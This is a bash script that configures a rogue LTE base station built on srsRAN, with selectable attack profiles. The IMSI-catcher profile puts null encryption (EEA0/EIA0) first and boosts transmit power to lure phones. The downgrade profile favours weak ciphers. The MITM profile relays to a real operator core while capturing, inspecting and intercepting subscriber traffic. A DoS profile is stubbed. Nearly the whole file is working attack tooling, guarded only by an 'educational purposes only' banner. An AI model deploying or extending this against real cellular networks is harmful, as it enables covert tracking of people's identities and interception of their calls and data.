#!/bin/bash
#####################################################################
# ATTACK CONFIGURATION TOOL
# 
# Configure and enable specific attack vectors for false base station
# Modifies configuration files based on selected attack profile
#####################################################################

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Paths
CONFIG_DIR="/etc/srsran/false"
ATTACK_PROFILES_DIR="/opt/attack_profiles"
ATTACK_MODES_CONF="/opt/configs/false/attack_modes.conf"
SIB_CONFIG_DIR="/etc/srsran/false"

#####################################################################
# Functions
#####################################################################

print_banner() {
    echo -e "${MAGENTA}"
    echo "╔════════════════════════════════════════════════════════╗"
    echo "║                                                        ║"
    echo "║         ATTACK CONFIGURATION TOOL v1.0                 ║"
    echo "║                                                        ║"
    echo "╚════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
}

print_warning() {
    echo -e "${RED}"
    echo "⚠️  WARNING: Configuring attack vectors"
    echo "   For RESEARCH and EDUCATIONAL purposes ONLY"
    echo "   Unauthorized use is ILLEGAL"
    echo -e "${NC}"
    echo ""
}

show_usage() {
    echo "Usage: $0 [COMMAND] [OPTIONS]"
    echo ""
    echo "Commands:"
    echo "  set <profile>            Set active attack profile"
    echo "  show                     Show current attack configuration"
    echo "  list                     List available attack profiles"
    echo "  edit <profile>           Edit attack profile settings"
    echo "  reset                    Reset to default configuration"
    echo "  help                     Show this help message"
    echo ""
    echo "Available Profiles:"
    echo "  imsi_catcher             Capture subscriber identities"
    echo "  downgrade                Force weak encryption"
    echo "  mitm                     Man-in-the-middle attack"
    echo "  dos                      Denial of service"
    echo ""
    echo "Examples:"
    echo "  $0 set imsi_catcher      # Activate IMSI catcher mode"
    echo "  $0 show                  # Show current configuration"
    echo "  $0 list                  # List all profiles"
    echo ""
}

list_profiles() {
    echo -e "${BLUE}Available Attack Profiles:${NC}"
    echo ""
    
    if [ -d "$ATTACK_PROFILES_DIR" ]; then
        for profile in "$ATTACK_PROFILES_DIR"/*.conf; do
            if [ -f "$profile" ]; then
                local name=$(basename "$profile" .conf)
                local desc=""
                
                # Extract description from profile
                if grep -q "ATTACK_DESCRIPTION=" "$profile"; then
                    desc=$(grep "ATTACK_DESCRIPTION=" "$profile" | cut -d'"' -f2)
                fi
                
                echo -e "  ${GREEN}●${NC} ${name}"
                if [ -n "$desc" ]; then
                    echo "     $desc"
                fi
                echo ""
            fi
        done
    else
        echo -e "${YELLOW}No attack profiles found${NC}"
    fi
}

show_current_config() {
    echo -e "${BLUE}Current Attack Configuration:${NC}"
    echo ""
    
    if [ -f "$ATTACK_MODES_CONF" ]; then
        source "$ATTACK_MODES_CONF"
        
        echo "Active Mode: ${GREEN}$ACTIVE_MODE${NC}"
        echo ""
        echo "Attack Settings:"
        echo "  IMSI Catcher:     $([ "$IMSI_CATCHER_ENABLED" == "true" ] && echo "${GREEN}Enabled${NC}" || echo "${YELLOW}Disabled${NC}")"
        echo "  Downgrade Attack: $([ "$DOWNGRADE_ENABLED" == "true" ] && echo "${GREEN}Enabled${NC}" || echo "${YELLOW}Disabled${NC}")"
        echo "  MITM:             $([ "$MITM_ENABLED" == "true" ] && echo "${GREEN}Enabled${NC}" || echo "${YELLOW}Disabled${NC}")"
        echo "  DoS:              $([ "$DOS_ENABLED" == "true" ] && echo "${GREEN}Enabled${NC}" || echo "${YELLOW}Disabled${NC}")"
        echo ""
        echo "Signal Management:"
        echo "  TX Gain (Start):  $SIGNAL_TX_GAIN_START dB"
        echo "  TX Gain (Max):    $SIGNAL_TX_GAIN_MAX dB"
        echo "  Ramp Interval:    $SIGNAL_RAMP_UP_INTERVAL seconds"
        echo ""
        echo "Startup Timer:"
        echo "  Delay:            $STARTUP_DELAY seconds"
        echo "  Countdown:        $([ "$STARTUP_COUNTDOWN" == "true" ] && echo "Enabled" || echo "Disabled")"
        echo ""
        echo "PLMN Configuration:"
        echo "  Use Legit PLMN:   $([ "$USE_LEGITIMATE_PLMN" == "true" ] && echo "Yes (${LEGITIMATE_MCC}/${LEGITIMATE_MNC})" || echo "No (${ROGUE_MCC}/${ROGUE_MNC})")"
    else
        echo -e "${YELLOW}No configuration file found${NC}"
    fi
}

set_attack_profile() {
    local profile=$1
    local profile_file="$ATTACK_PROFILES_DIR/${profile}.conf"
    
    if [ ! -f "$profile_file" ]; then
        echo -e "${RED}Error: Profile '$profile' not found${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Activating attack profile: ${profile}${NC}"
    echo ""
    
    # Source the profile to get settings
    source "$profile_file"
    
    # Display profile info
    if [ -n "$ATTACK_DESCRIPTION" ]; then
        echo "Description:"
        echo "  $ATTACK_DESCRIPTION"
        echo ""
    fi
    
    # Update attack_modes.conf
    if [ -f "$ATTACK_MODES_CONF" ]; then
        # Update ACTIVE_MODE
        sudo sed -i "s/^ACTIVE_MODE=.*/ACTIVE_MODE=\"${profile}\"/" "$ATTACK_MODES_CONF"
        
        # Enable/disable attack types based on profile
        case $profile in
            "imsi_catcher")
                sudo sed -i "s/^IMSI_CATCHER_ENABLED=.*/IMSI_CATCHER_ENABLED=true/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOWNGRADE_ENABLED=.*/DOWNGRADE_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^MITM_ENABLED=.*/MITM_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOS_ENABLED=.*/DOS_ENABLED=false/" "$ATTACK_MODES_CONF"
                
                # Configure for IMSI catching
                apply_imsi_catcher_config
                ;;
            "downgrade")
                sudo sed -i "s/^IMSI_CATCHER_ENABLED=.*/IMSI_CATCHER_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOWNGRADE_ENABLED=.*/DOWNGRADE_ENABLED=true/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^MITM_ENABLED=.*/MITM_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOS_ENABLED=.*/DOS_ENABLED=false/" "$ATTACK_MODES_CONF"
                
                # Configure for downgrade attack
                apply_downgrade_config
                ;;
            "mitm")
                sudo sed -i "s/^IMSI_CATCHER_ENABLED=.*/IMSI_CATCHER_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOWNGRADE_ENABLED=.*/DOWNGRADE_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^MITM_ENABLED=.*/MITM_ENABLED=true/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOS_ENABLED=.*/DOS_ENABLED=false/" "$ATTACK_MODES_CONF"
                
                # Configure for MITM
                apply_mitm_config
                ;;
            "dos")
                sudo sed -i "s/^IMSI_CATCHER_ENABLED=.*/IMSI_CATCHER_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOWNGRADE_ENABLED=.*/DOWNGRADE_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^MITM_ENABLED=.*/MITM_ENABLED=false/" "$ATTACK_MODES_CONF"
                sudo sed -i "s/^DOS_ENABLED=.*/DOS_ENABLED=true/" "$ATTACK_MODES_CONF"
                
                # Configure for DoS
                apply_dos_config
                ;;
        esac
        
        echo -e "${GREEN}✓ Attack profile '${profile}' activated${NC}"
        echo ""
        echo "Use './scripts/start_false_bs.sh -a ${profile}' to start"
    else
        echo -e "${RED}Error: Configuration file not found${NC}"
        return 1
    fi
}

apply_imsi_catcher_config() {
    echo "Applying IMSI catcher configuration..."

    # Force EEA0 and EIA0 for no encryption
    local enb_conf="$CONFIG_DIR/enb.conf"
    if [ -f "$enb_conf" ]; then
        sudo sed -i '/eea_pref_list/c\eea_pref_list = EEA0, EEA1, EEA2' "$enb_conf"
        sudo sed -i '/eia_pref_list/c\eia_pref_list = EIA0, EIA1, EIA2' "$enb_conf"
    fi

    # Increase TX gain for stronger signal to attract UEs
    if [ -f "$enb_conf" ]; then
        sudo sed -i 's/tx_gain = [0-9]*/tx_gain = 85/' "$enb_conf"
    fi

    # Adjust cell reselection parameters to be more attractive
    if [ -f "$SIB_CONFIG_DIR/sib.conf" ]; then
        sudo sed -i 's/cell_resel_prio = 7/cell_resel_prio = 7/' "$SIB_CONFIG_DIR/sib.conf"  # Already set to 7
        sudo sed -i 's/q_offset_freq = -10/q_offset_freq = -10/' "$SIB_CONFIG_DIR/sib.conf"  # Already set to -10
    fi

    echo "  ✓ Encryption disabled (EEA0/EIA0 prioritized)"
    echo "  ✓ TX gain increased to 85 dB for stronger signal"
    echo "  ✓ Cell reselection optimized for UE attraction"
    echo "  ✓ Identity capture enabled"
}

apply_downgrade_config() {
    echo "Applying downgrade attack configuration..."

    # Prioritize weak algorithms
    local enb_conf="$CONFIG_DIR/enb.conf"
    if [ -f "$enb_conf" ]; then
        sudo sed -i '/eea_pref_list/c\eea_pref_list = EEA0, EEA1' "$enb_conf"
        sudo sed -i '/eia_pref_list/c\eia_pref_list = EIA0, EIA1' "$enb_conf"
    fi

    echo "  ✓ Weak algorithms prioritized"
}

apply_mitm_config() {
    echo "Applying MITM configuration..."

    # Load MITM profile settings
    if [ -f "$ATTACK_PROFILES_DIR/mitm.conf" ]; then
        source "$ATTACK_PROFILES_DIR/mitm.conf"
    fi

    # Configure core network relay
    local enb_conf="$CONFIG_DIR/enb.conf"
    if [ "$RELAY_TO_REAL_CORE" == "true" ]; then
        if [ -f "$enb_conf" ]; then
            # Ensure MME address points to real core
            sudo sed -i "s|mme_addr = .*|mme_addr = $REAL_CORE_MME_IP|" "$enb_conf"
        fi
        echo "  ✓ Relay to real core network enabled (MME: $REAL_CORE_MME_IP)"
    fi

    # Enable packet capture for interception
    if [ "$CAPTURE_ALL_TRAFFIC" == "true" ] && [ -n "$CAPTURE_PCAP" ]; then
        # Create capture directory
        sudo mkdir -p "$(dirname "$CAPTURE_PCAP")"
        echo "  ✓ Full traffic capture enabled: $CAPTURE_PCAP"
    fi

    # Configure DPI if enabled
    if [ "$DPI_ENABLED" == "true" ] && [ -n "$DPI_LOG" ]; then
        sudo mkdir -p "$(dirname "$DPI_LOG")"
        echo "  ✓ Deep packet inspection enabled: $DPI_LOG"
    fi

    # Set up traffic interception
    if [ "$INTERCEPT_NAS_MESSAGES" == "true" ] || [ "$INTERCEPT_USER_PLANE" == "true" ]; then
        echo "  ✓ Traffic interception configured"
        echo "    - NAS messages: $INTERCEPT_NAS_MESSAGES"
        echo "    - User plane: $INTERCEPT_USER_PLANE"
        echo "    - Control plane: $INTERCEPT_CONTROL_PLANE"
    fi

    echo "  ✓ MITM attack fully configured"
}

apply_dos_config() {
    echo "Applying DoS configuration..."
    
    echo "  ✓ Connection rejection enabled"
    echo "  ✓ Resource limits configured"
}

reset_config() {
    echo -e "${YELLOW}Resetting to default configuration...${NC}"
    
    if [ -f "$ATTACK_MODES_CONF" ]; then
        sudo sed -i "s/^ACTIVE_MODE=.*/ACTIVE_MODE=\"imsi_catcher\"/" "$ATTACK_MODES_CONF"
        sudo sed -i "s/^IMSI_CATCHER_ENABLED=.*/IMSI_CATCHER_ENABLED=true/" "$ATTACK_MODES_CONF"
        sudo sed -i "s/^DOWNGRADE_ENABLED=.*/DOWNGRADE_ENABLED=false/" "$ATTACK_MODES_CONF"
        sudo sed -i "s/^MITM_ENABLED=.*/MITM_ENABLED=false/" "$ATTACK_MODES_CONF"
        sudo sed -i "s/^DOS_ENABLED=.*/DOS_ENABLED=false/" "$ATTACK_MODES_CONF"
        
        echo -e "${GREEN}✓ Configuration reset to defaults${NC}"
    fi
}

#####################################################################
# Main
#####################################################################

print_banner
print_warning

if [ $# -eq 0 ]; then
    show_usage
    exit 1
fi

case "$1" in
    "set")
        if [ -z "$2" ]; then
            echo -e "${RED}Error: Profile name required${NC}"
            show_usage
            exit 1
        fi
        set_attack_profile "$2"
        ;;
    "show")
        show_current_config
        ;;
    "list")
        list_profiles
        ;;
    "reset")
        reset_config
        ;;
    "help"|"-h"|"--help")
        show_usage
        ;;
    *)
        echo -e "${RED}Error: Invalid command '$1'${NC}"
        show_usage
        exit 1
        ;;
esac

